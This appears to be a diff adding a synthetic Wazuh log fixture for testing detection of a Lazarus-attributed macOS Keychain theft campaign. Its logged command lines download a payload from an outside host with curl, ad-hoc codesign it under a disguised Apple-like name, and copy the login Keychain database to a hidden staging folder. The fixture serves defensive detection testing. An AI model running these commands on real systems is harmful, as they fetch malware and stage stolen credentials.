@@ -1,0 +1,167 @@
+{
+  "_metadata": {
+    "attack_id": "T1555.001",
+    "variation": "001",
+    "name": "Lazarus Prospect Call macOS Keychain Theft",
+    "description": "Lazarus Group Prospect Call campaign targets macOS via fake Teams meetings to steal Keychain credentials",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "credential-access",
+    "source_url": "https://daylight.ai/blog/prospect-call-microsoft-teams-meetings",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "macOS process - curl downloading payload",
+      "sequence": 1,
+      "log": {
+        "timestamp": "2026-02-03T09:30:00.000Z",
+        "rule": {
+          "level": 12,
+          "description": "macOS - Suspicious curl download to Library Caches",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1105"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Ingress Tool Transfer"
+            ]
+          },
+          "groups": [
+            "macos",
+            "process_creation"
+          ]
+        },
+        "agent": {
+          "id": "002",
+          "name": "ANALYST01",
+          "ip": "198.51.100.50"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "macos_log"
+        },
+        "data": {
+          "process": {
+            "name": "curl",
+            "commandLine": "curl -o /Library/Caches/com.apple.sys.receipt http://bluyy.com/payload",
+            "user": "victim",
+            "ppid": "1234",
+            "parentName": "zsh"
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1105",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "macOS process - ad-hoc code signing",
+      "sequence": 2,
+      "log": {
+        "timestamp": "2026-02-03T09:30:05.000Z",
+        "rule": {
+          "level": 12,
+          "description": "macOS - Ad-hoc code signing detected",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1553.002",
+              "T1036.005"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Code Signing",
+              "Masquerading"
+            ]
+          },
+          "groups": [
+            "macos",
+            "process_creation"
+          ]
+        },
+        "agent": {
+          "id": "002",
+          "name": "ANALYST01",
+          "ip": "198.51.100.50"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "macos_log"
+        },
+        "data": {
+          "process": {
+            "name": "codesign",
+            "commandLine": "codesign --force --deep --sign - /Library/Caches/com.apple.sys.receipt",
+            "user": "victim",
+            "ppid": "1234",
+            "parentName": "zsh"
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1553.002",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "macOS process - Keychain database copy",
+      "sequence": 3,
+      "log": {
+        "timestamp": "2026-02-03T09:30:30.000Z",
+        "rule": {
+          "level": 14,
+          "description": "macOS - Keychain database copy detected",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1555.001"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "Keychain"
+            ]
+          },
+          "groups": [
+            "macos",
+            "process_creation"
+          ]
+        },
+        "agent": {
+          "id": "002",
+          "name": "ANALYST01",
+          "ip": "198.51.100.50"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "macos_log"
+        },
+        "data": {
+          "process": {
+            "name": "cp",
+            "commandLine": "cp -rf /Users/victim/Library/Keychains/login.keychain-db /tmp/.staging",
+            "user": "victim",
+            "ppid": "5678",
+            "parentName": "osascript"
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1555.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    }
+  ]
+}
